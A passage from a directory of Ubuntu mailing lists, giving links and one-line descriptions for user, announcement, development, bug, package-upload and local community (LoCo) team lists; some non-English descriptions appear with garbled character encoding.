  Lubuntu Help and User Discussions
* [ubuntu-studio-users](http://lists.ubuntu.com/mailman/listinfo/ubuntu-studio-users) -
  Ubuntu Studio Users
* [ubuntukylin-users](http://lists.ubuntu.com/mailman/listinfo/Ubuntukylin-users) -
  Ubuntu Kylin Support and User Discussions
* [xubuntu-users](http://lists.ubuntu.com/mailman/listinfo/xubuntu-users) -
  Xubuntu Support and User Discussions

## Announcement Lists

* [bazaar-announce](http://lists.ubuntu.com/mailman/listinfo/bazaar-announce) -
  Announcements for the Bazaar project
* [community-announce](http://lists.ubuntu.com/mailman/listinfo/Community-announce) -
  Community announcement list
* [fwts-announce](http://lists.ubuntu.com/mailman/listinfo/Fwts-announce) -
  Firmware Test Suite Announcements
* [kernel-sru-announce](http://lists.ubuntu.com/mailman/listinfo/Kernel-sru-announce) -
  For announcement of things impacting the kernel sru cycle
* [launchpad-announce](http://lists.ubuntu.com/mailman/listinfo/Launchpad-announce) -
  Launchpad.net Announcements
* [snapcraft-announce](http://lists.ubuntu.com/mailman/listinfo/Snapcraft-announce) -
  To coordinate snapd packaging notifications
* [ubuntu-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-announce) -
  Ubuntu Announcements
* [ubuntu-cloud-announce](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cloud-announce) -
  Official announcements about Ubuntu Cloud and Guests
* [ubuntu-devel-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-devel-announce) -
  Developer-related announcements and information
* [ubuntu-mirrors-announce](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mirrors-announce) -
  Ubuntu Mirror Announcement List
* [ubuntu-news](http://lists.ubuntu.com/mailman/listinfo/ubuntu-news) -
  News about Ubuntu interesting to users and developers alike
* [ubuntu-security-announce](http://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce) -
  Ubuntu Security Announcements

The mailing list snapcraft is private and not meant to be indexed.
## Development Lists

* [ubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-devel) -
  Ubuntu Development (developers)
* [ubuntu-devel-discuss](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-devel-discuss) -
  Ubuntu Development (users and developers)
* [checkbox-devel](http://lists.ubuntu.com/mailman/listinfo/Checkbox-devel) -
  Checkbox development
* [edubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/edubuntu-devel) -
  Edubuntu Development & Technical Discussion
* [edubuntu-devel-es](http://lists.ubuntu.com/mailman/listinfo/edubuntu-devel-es) -
  Edubuntu Hispanoparlantes
* [fwts-devel](http://lists.ubuntu.com/mailman/listinfo/fwts-devel) -
  Firmware Test Suite Development
* [kernel-team](http://lists.ubuntu.com/mailman/listinfo/kernel-team) -
  Kernel team discussions
* [kubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/kubuntu-devel) -
  Kubuntu Developer Discussion
* [lubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/Lubuntu-devel) -
  Lubuntu development, testing and bug management
* [maas-devel](http://lists.ubuntu.com/mailman/listinfo/Maas-devel) -
  Mailing list for discussing the development of MAAS
* [mir-devel](http://lists.ubuntu.com/mailman/listinfo/Mir-devel) -
  Mir Development
* [ubuntu-accessibility-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility-devel) -
  Ubuntu Accessibility development discussions
* [ubuntu-app-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-app-devel) -
* [ubuntu-archive](http://lists.ubuntu.com/mailman/listinfo/ubuntu-archive) -
  Ubuntu Archive Team discussion and co-ordination
* [ubuntu-desktop](http://lists.ubuntu.com/mailman/listinfo/ubuntu-desktop) -
  Desktop Team co-ordination and discussion
* [ubuntu-distributed-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-distributed-devel) -
  Discussion of the Ubuntu Distributed Development initiative
* [ubuntu-motu](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu) -
  mailing list of the Masters Of The Universe
* [ubuntu-release](http://lists.ubuntu.com/mailman/listinfo/ubuntu-release) -
  Ubuntu release co-ordination and discussion
* [ubuntu-server](http://lists.ubuntu.com/mailman/listinfo/ubuntu-server) -
  Ubuntu Server Development mailing list
* [ubuntu-studio-devel](http://lists.ubuntu.com/mailman/listinfo/ubuntu-studio-devel) -
  Ubuntu Studio Development
* [ubuntu-utah-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-utah-devel) -
  Ubuntu Test Automation Harness Development discussion, for all those people wanting to contribute test cases and provisioning methods
* [ubuntukylin-devel](http://lists.ubuntu.com/mailman/listinfo/Ubuntukylin-devel) -
  Ubuntu Kylin Development Discussion
* [upstart-devel](http://lists.ubuntu.com/mailman/listinfo/upstart-devel) -
  Upstart development
* [xubuntu-devel](http://lists.ubuntu.com/mailman/listinfo/xubuntu-devel) -
  Xubuntu Development Discussion
* [community-web-projects](http://lists.ubuntu.com/mailman/listinfo/community-web-projects) -
  Discussion list for all community web projects including LoCo Team Directory, Summit, Hall of Fame, Django Foundations and the community web themes.

The mailing list laptop-testing-team could not be found!
## Quality Assurance and Related Lists

* [ubuntu-quality](http://lists.ubuntu.com/mailman/listinfo/ubuntu-quality) -
  Ubuntu Quality Assurance (testing and bug triage) discussion list
* [ubuntu-bugsquad](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bugsquad) -
  Discussion about reporting, triaging and working with bugs

## Bug Lists

* [ubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bugs) -
  Ubuntu bug tracker changes - HIGH VOLUME
* [universe-bugs](http://lists.ubuntu.com/mailman/listinfo/universe-bugs) -
  Universe bug tracker changes - HIGH VOLUME
* [desktop-bugs](http://lists.ubuntu.com/mailman/listinfo/desktop-bugs) -
  Desktop bug tracker changes - HIGH VOLUME
* [kubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/kubuntu-bugs) -
  Kubuntu bug tracker changes
* [kernel-bugs](http://lists.ubuntu.com/mailman/listinfo/kernel-bugs) -
  Kernel Bugs tracking
* [ubuntu-accessibility-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility-bugs) -
  Bug contact for the Ubuntu Accessibility Team
* [foundations-bugs](http://lists.ubuntu.com/mailman/listinfo/foundations-bugs) -
  Ubuntu Foundations bug changes
* [ubuntu-openstack-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-openstack-bugs) -
  Ubuntu OpenStack Bug Mail
* [ubuntu-server-bugs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-server-bugs) -
  Server bug tracker changes
* [xubuntu-bugs](http://lists.ubuntu.com/mailman/listinfo/Xubuntu-bugs) -
  Xubuntu Bugs Discussion

## Package Upload and Automatic Notification Lists

* [lucid-changes](http://lists.ubuntu.com/mailman/listinfo/Lucid-changes) -
  Lucid Lynx archive upload notification list
* [hardy-changes](http://lists.ubuntu.com/mailman/listinfo/Hardy-changes) -
  Hardy Heron archive upload notification list
* [artful-changes](http://lists.ubuntu.com/mailman/listinfo/Artful-changes) -
  Artful Aardvark changes
* [bionic-changes](http://lists.ubuntu.com/mailman/listinfo/Bionic-changes) -
  Bionic Beaver changes
* [cloud-archive-changes](http://lists.ubuntu.com/mailman/listinfo/Cloud-archive-changes) -
  Medium volume automatic messages of each package change in the cloud archive
* [cloud-tools-changes](http://lists.ubuntu.com/mailman/listinfo/Cloud-tools-changes) -
* [cosmic-changes](http://lists.ubuntu.com/mailman/listinfo/Cosmic-changes) -
  Cosmic changes
* [disco-changes](http://lists.ubuntu.com/mailman/listinfo/Disco-changes) -
  Disco changes
* [eoan-changes](http://lists.ubuntu.com/mailman/listinfo/Eoan-changes) -
  Eoan changes
* [focal-changes](http://lists.ubuntu.com/mailman/listinfo/Focal-changes) -
  Focal changes
* [groovy-changes](http://lists.ubuntu.com/mailman/listinfo/Groovy-changes) -
  Groovy changes
* [hirsute-changes](http://lists.ubuntu.com/mailman/listinfo/Hirsute-changes) -
* [impish-changes](http://lists.ubuntu.com/mailman/listinfo/impish-changes) -
* [jammy-changes](http://lists.ubuntu.com/mailman/listinfo/jammy-changes) -
* [kinetic-changes](http://lists.ubuntu.com/mailman/listinfo/kinetic-changes) -
* [lunar-changes](http://lists.ubuntu.com/mailman/listinfo/lunar-changes) -
  Lunar changes
* [mantic-changes](http://lists.ubuntu.com/mailman/listinfo/mantic-changes) -
  Mantic changes
* [maverick-changes](http://lists.ubuntu.com/mailman/listinfo/Maverick-changes) -
  Maverick Meerkat archive upload notification list
* [natty-changes](http://lists.ubuntu.com/mailman/listinfo/Natty-changes) -
  Natty Narwhal archive upload notification list
* [noble-changes](http://lists.ubuntu.com/mailman/listinfo/noble-changes) -
  Noble changes
* [oneiric-changes](http://lists.ubuntu.com/mailman/listinfo/Oneiric-changes) -
  Oneiric Ocelot archive upload notification list
* [oracular-changes](http://lists.ubuntu.com/mailman/listinfo/oracular-changes) -
  Oracular changes
* [plucky-changes](http://lists.ubuntu.com/mailman/listinfo/plucky-changes) -
  Plucky changes
* [precise-changes](http://lists.ubuntu.com/mailman/listinfo/Precise-changes) -
  Precise Pangolin archive upload notification list
* [quantal-changes](http://lists.ubuntu.com/mailman/listinfo/Quantal-changes) -
  Quantal Quetzal archive upload notification list
* [raring-changes](http://lists.ubuntu.com/mailman/listinfo/Raring-changes) -
  Raring Ringtail archive upload notification list
* [rtm-14.09-changes](http://lists.ubuntu.com/mailman/listinfo/Rtm-14.09-changes) -
  Ubuntu RTM archive upload notification list
* [saucy-changes](http://lists.ubuntu.com/mailman/listinfo/Saucy-changes) -
  Saucy Salamander archive upload notification list
* [trusty-changes](http://lists.ubuntu.com/mailman/listinfo/Trusty-changes) -
  Trusty Tahr archive upload notification list
* [ubuntu-patches](http://lists.ubuntu.com/mailman/listinfo/ubuntu-patches) -
  Ubuntu patch upload notifications - HIGH VOLUME
* [utopic-changes](http://lists.ubuntu.com/mailman/listinfo/Utopic-changes) -
  Utopic Unicorn archive upload notification list
* [vivid-changes](http://lists.ubuntu.com/mailman/listinfo/Vivid-changes) -
  Vivid Vervet archive upload notification list
* [wily-changes](http://lists.ubuntu.com/mailman/listinfo/Wily-changes) -
  Wily Werewolf changes
* [xenial-changes](http://lists.ubuntu.com/mailman/listinfo/Xenial-changes) -
  Xenial Xerus changes
* [yakkety-changes](http://lists.ubuntu.com/mailman/listinfo/Yakkety-changes) -
  Yakkety Yak changes
* [zesty-changes](http://lists.ubuntu.com/mailman/listinfo/Zesty-changes) -
  Zesty Zapus changes

The mailing list edubuntu-quebec is private and not meant to be indexed.
## Ubuntu Worldwide LoCo Teams

* [ubuntu-ae](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ae) -
  Ubuntu UAE Mailing List
* [ubuntu-af](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-af) -
  Afghanistan Ubuntu Loco Team
* [ubuntu-ar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ar) -
  Ubuntu User Group Argentina
* [ubuntu-at](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-at) -
  Ubuntu Austria LoCo Team Mailingliste
* [ubuntu-au](http://lists.ubuntu.com/mailman/listinfo/ubuntu-au) -
  Ubuntu in Australia
* [ubuntu-au-wa](http://lists.ubuntu.com/mailman/listinfo/ubuntu-au-wa) -
  Ubuntu Western Australia Local Community Team list
* [ubuntu-az](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-az) -
  Ubuntu Azerbaijan
* [ubuntu-ba](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ba) -
  Ubuntu LoCo tim Bosne i Hercegovine
* [ubuntu-bd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-bd) -
  Ubuntu Bangladesh
* [ubuntu-be](http://lists.ubuntu.com/mailman/listinfo/ubuntu-be) -
  Ubuntu Belgium
* [ubuntu-bf](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bf) -
* [ubuntu-bg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bg) -
  Ubuntu users in Bulgaria
* [ubuntu-bh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bh) -
  Ubuntu users in Bahrain
* [ubuntu-bo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bo) -
  Lista de discusiÃ³n de Bolivia - Ubuntu LoCo Team
* [ubuntu-br](http://lists.ubuntu.com/mailman/listinfo/ubuntu-br) -
  Lista de discussÃ£o da Comunidade Ubuntu Brasil
* [ubuntu-bs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bs) -
* [ubuntu-by](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-by) -
  Ubuntu Belarus Team
* [ubuntu-ca](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ca) -
  The Canadian Ubuntu Users Community
* [ubuntu-cd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-cd) -
  Ubuntu Democratic Republic of Congo
* [ubuntu-ch](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ch) -
  Ubuntu Swiss Users
* [ubuntu-ci](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ci) -
  CommunautÃ© Ivoirienne UBUNTU
* [ubuntu-cl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cl) -
  Ubuntu Chile
* [ubuntu-cm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cm) -
  Ubuntu Cameroon Local Community Team
* [ubuntu-co](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-co) -
  Ubuntu Colombia
* [ubuntu-cr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-cr) -
  Costa Rica Ubuntu LoCoTeam
* [ubuntu-cu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cu) -
  Fraternidad de Ubuntu Cuba
* [ubuntu-cy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cy) -
  Ubuntu-cy LoCo Team
* [ubuntu-de](http://lists.ubuntu.com/mailman/listinfo/ubuntu-de) -
  Ubuntu-Diskussion
* [ubuntu-de-events](http://lists.ubuntu.com/mailman/listinfo/ubuntu-de-events) -
  Ubuntu auf Veranstaltungen im Raum DE.
* [ubuntu-dk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-dk) -
  Dansk mailingliste til det danske Ubuntu LocoTeam til diskussion/koordination af aktiviteter
* [ubuntu-do](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-do) -
  Ubuntu Dominican Republic
* [ubuntu-dz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-dz) -
  Ubuntu Algeria
* [ubuntu-ec](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ec) -
  Ubuntu-EC mailist
* [ubuntu-eg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-eg) -
  Ubuntu Egypt LoCo Team
* [ubuntu-es](http://lists.ubuntu.com/mailman/listinfo/ubuntu-es) -
  Asistencia para usuarios de Ubuntu en Castellano
* [ubuntu-es-es](http://lists.ubuntu.com/mailman/listinfo/ubuntu-es-es) -
  Ubuntu EspaÃ±a
* [ubuntu-et](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-et) -
  Ubuntu Ethiopia
* [ubuntu-fi](http://lists.ubuntu.com/mailman/listinfo/ubuntu-fi) -
  SÃ¤hkÃ¶postilista Ubuntu-keskustelulle (Ubuntu Finland)
* [ubuntu-fr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-fr) -
  Liste de discussion sur Ubuntu
* [ubuntu-ge](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ge) -
  Ubuntu Georgian Users Mailing List
* [ubuntu-gr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-gr) -
  Ubuntu Greece discussion list
* [ubuntu-gt](http://lists.ubuntu.com/mailman/listinfo/ubuntu-gt) -
  Ubuntu Guatemala
* [ubuntu-hk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hk) -
  Ubuntu HK LoCo Team
* [ubuntu-hn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-hn) -
  Ubuntu Honduras
* [ubuntu-hu](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hu) -
  Hungarian LoCo team mailing list
* [ubuntu-id](http://lists.ubuntu.com/mailman/listinfo/ubuntu-id) -
  Ubuntu User Group Indonesia.
* [ubuntu-ie](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ie) -
  Ubuntu Ireland Mailing List
* [ubuntu-in](http://lists.ubuntu.com/mailman/listinfo/ubuntu-in) -
  Ubuntu India Local Community
* [ubuntu-in-ap](http://lists.ubuntu.com/mailman/listinfo/ubuntu-in-ap) -
  Ubuntu Andhra Pradesh Local Community
* [ubuntu-ir](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ir) -
  Ubuntu Iranian Team Mailing List
* [ubuntu-it](http://lists.ubuntu.com/mailman/listinfo/ubuntu-it) -
  Supporto per gli utenti Italiani di Ubuntu
* [ubuntu-jo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-jo) -
  Ubuntu Jordan Local Community Team
* [ubuntu-jp](http://lists.ubuntu.com/mailman/listinfo/ubuntu-jp) -
  Ubuntu Japanese Local Community Team
* [ubuntu-ke](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ke) -
  Ubuntu Kenyan LoCoTeam Mailing List
* [ubuntu-kg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kg) -
  Ubuntu Kyrgyzstan
* [ubuntu-kh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kh) -
  Ubuntu Cambodia
* [ubuntu-ko](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ko) -
  Korean Ubuntu Users Mailing List
* [ubuntu-kur](http://lists.ubuntu.com/mailman/listinfo/ubuntu-kur) -
  Listeya bikarheneren Ubuntu ya kurdi
* [ubuntu-kw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kw) -
* [ubuntu-kz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-kz) -
  Ubuntu Kazakstan Loco Team List
* [ubuntu-lb](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lb) -
  Ubuntu Lebanon Location Team
* [ubuntu-lk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lk) -
  Ubuntu Sri Lanka
* [ubuntu-lr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lr) -
  Ubuntu Liberia
* [ubuntu-lt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lt) -
  Ubuntu Lithuania
* [ubuntu-lu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lu) -
  Ubuntu Luxembourgian Users
* [ubuntu-lv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-lv) -
  Ubuntu Latvijas kopiena
* [ubuntu-ma](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ma) -
  Ubuntu Moroccan Users
* [ubuntu-md](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-md) -
  Ubuntu Moldova
* [ubuntu-me](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-me) -
  Ubuntu Montenegro Loco Team
* [ubuntu-mg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mg) -
  Ubuntu Madagascar LoCo Team
* [ubuntu-mk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mk) -
  Ubuntu Macedonia LoCo Team
* [ubuntu-ml](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ml) -
  Ubuntu Mali
* [ubuntu-mt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mt) -
  Ubuntu Malta
* [ubuntu-mx](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mx) -
  Lista de correos de la comunidad de Ubuntu Linux en Mexico
* [ubuntu-my](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-my) -
  Malaysian Team Mailing List
* [ubuntu-mz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mz) -
  Ubuntu Mozambique LoCo List
* [ubuntu-na](http://lists.ubuntu.com/mailman/listinfo/ubuntu-na) -
  Ubuntu LoCo Team Namibia Mailing List
* [ubuntu-ne](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ne) -
  Ubuntu Niger
* [ubuntu-ng](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ng) -
  Ubuntu Nigeria
* [ubuntu-ni](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ni) -
  Lista de correos del Grupo Ubuntu Nicaragua.
* [ubuntu-nl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-NL) -
  Nederlandstalige Ubuntu ondersteuning en discussie
* [ubuntu-no](http://lists.ubuntu.com/mailman/listinfo/ubuntu-no) -
  Generell epost-liste for Ubuntu Norge
* [ubuntu-np](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-np) -
  Discussion list for Ubuntu Nepal
* [ubuntu-nz](http://lists.ubuntu.com/mailman/listinfo/ubuntu-nz) -
  Advocacy and discussion about Ubuntu in New Zealand
* [ubuntu-pa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pa) -
  Ubuntu PanamÃ¡
* [ubuntu-pe](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pe) -
  Ubuntu Peruvian LoCo Team
* [ubuntu-pg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pg) -
  Papua New Guinea Ubuntu Users
* [ubuntu-ph](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ph) -
  Mailing List para sa Ubuntu Pilipinas (Philippines)
* [ubuntu-pk](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-pk) -
  Ubuntu-Linux Pakistan Team
* [ubuntu-pl](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pl) -
  Polska lista dyskusyjna uÂ¿ytkownikÃ³w Ubuntu
* [ubuntu-pr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-PR) -
  Equipo Puerto Rico "LoCo" de Ubuntu
* [ubuntu-ps](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ps) -
  Ø§ÙÙØ§Ø¦ÙØ© Ø§ÙØ¨Ø±ÙØ¯ÙØ© ÙÙØ±ÙÙ Ø£ÙØ¨ÙØªÙ Ø§ÙÙÙØ³Ø·ÙÙÙ
* [ubuntu-pt](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pt) -
  Lista de DiscussÃ£o sobre o Ubuntu
* [ubuntu-qa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-qa) -
  Ubuntu Qatar
* [ubuntu-quebec](http://lists.ubuntu.com/mailman/listinfo/ubuntu-quebec) -
  Ubuntu QuÃ©bec
* [ubuntu-ro](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ro) -
  Lista de discutii a echipei Ubuntu RomÃ¢nia
* [ubuntu-rs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-rs) -
  Ubuntu Serbia Local Community Team
* [ubuntu-ru](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ru) -
  Mailing list for Russian-speaking Ubuntu users
* [ubuntu-sd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sd) -
  Ubuntu Sudan
* [ubuntu-se](http://lists.ubuntu.com/mailman/listinfo/ubuntu-se) -
  Ubuntu Sverige
* [ubuntu-sg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-SG) -
  The Singapore Ubuntu Team
* [ubuntu-si](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-si) -
  Ubuntu Slovenija
* [ubuntu-sn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sn) -
  Ubuntu Senegal
* [ubuntu-sv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sv) -
  Ubuntu El Salvador
* [ubuntu-sy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sy) -
  Ubuntu Syria Mailist
* [ubuntu-tam](http://lists.ubuntu.com/mailman/listinfo/ubuntu-tam) -
  உபுண்டு பயனர் மடலாடற் குழு - தமிழகம்
* [ubuntu-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tn) -
  Ubuntu Tunisian LoCo Team Mailing List
* [ubuntu-tr](http://lists.ubuntu.com/mailman/listinfo/ubuntu-tr) -
  Ubuntu Turkiye Users and Developers List
* [ubuntu-tt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tt) -
  Trinidad and Tobago Loco Team
* [ubuntu-tw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-TW) -
  Ubuntu Taiwan LoCo Team
* [ubuntu-tz](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-tz) -
  Ubuntu LocoTeam in Tanzania
* [ubuntu-ua](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ua) -
  Ubuntu Ukraine
* [ubuntu-ug](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ug) -
  Ubuntu Uganda
* [ubuntu-uk](http://lists.ubuntu.com/mailman/listinfo/ubuntu-uk) -
  UK Ubuntu Talk
* [ubuntu-us](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us) -
  US LoCo Teams
* [ubuntu-us-ak](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ak) -
  The Alaska Ubuntu Local Community Mailing List
* [ubuntu-us-al](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-al) -
  Alabama LoCo Team
* [ubuntu-us-ar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ar) -
  Ubuntu US Arkansas
* [ubuntu-us-az](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-az) -
  The mailing list for Ubuntu-Arizona LoCo Team
* [ubuntu-us-ca](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ca) -
  Ubuntu US California
* [ubuntu-us-chicago](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-chicago) -
  Ubuntu Chicago Local Community Team Mailing List
* [ubuntu-us-co](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-co) -
  Ubuntu Colorado Local Community Team
* [ubuntu-us-ct](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ct) -
  Ubuntu Connecticut Local Community Team
* [ubuntu-us-dc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-dc) -
  Ubuntu US District of Columbia
* [ubuntu-us-eastcoast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-eastcoast) -
  Ubuntu US East Coast
* [ubuntu-us-fl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-fl) -
  Mailing list for Ubuntu Florida LoCo Team
* [ubuntu-us-ga](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ga) -
  Georgia Ubuntu Mailing List
* [ubuntu-us-ia](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-IA) -
  Ubuntu Iowa Team
* [ubuntu-us-id](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-id) -
  Ubuntu US Idaho
* [ubuntu-us-il](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-il) -
  Ubuntu Illinois Local Community Team Mailing List
* [ubuntu-us-in](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-in) -
  Ubuntu's Indiana Local Community Team
* [ubuntu-us-ks](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ks) -
  Kansas Ubuntu Users Mailing List
* [ubuntu-us-ky](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ky) -
  Kentucky LoCo Team mailing list
* [ubuntu-us-la](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-la) -
  Ubuntu Louisiana Local Community Team
* [ubuntu-us-ma](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ma) -
  Ubuntu Massachusetts Local Community Team
* [ubuntu-us-md](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-md) -
  Ubuntu Maryland Loco Team
* [ubuntu-us-me](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-me) -
  Ubuntu Maine-iacs LoCo Team list
* [ubuntu-us-mi](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-mi) -
  Ubuntu Michigan Local Community Team
* [ubuntu-us-mn](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-mn) -
  Ubuntu Minnesota Local Community Team
* [ubuntu-us-mo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-mo) -
  Ubuntu Missouri Team
* [ubuntu-us-ms](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-MS) -
  Mailing List for the Mississippi Ubuntu LoCo Team
* [ubuntu-us-nc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nc) -
  Ubuntu North Carolina Local Community Team
* [ubuntu-us-nd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-nd) -
  Ubuntu North Dakota Local Community Team
* [ubuntu-us-ne](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ne) -
  Ubuntu Nebraska Local Community Team
* [ubuntu-us-nh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-NH) -
  Ubuntu New Hampshire LoCo Team
* [ubuntu-us-nj](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-nj) -
  Mailing list for the Ubuntu New Jersey LoCo Team
* [ubuntu-us-nm](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nm) -
  Ubuntu US New Mexico LoCo Team
* [ubuntu-us-nv](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nv) -
  Ubuntu Nevada Local Community Team
* [ubuntu-us-oh](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-oh) -
  Ubuntu Ohio
* [ubuntu-us-ok](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ok) -
  Oklahoma LoCo list
* [ubuntu-us-or](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-or) -
  Ubuntu Oregon LoCo Team
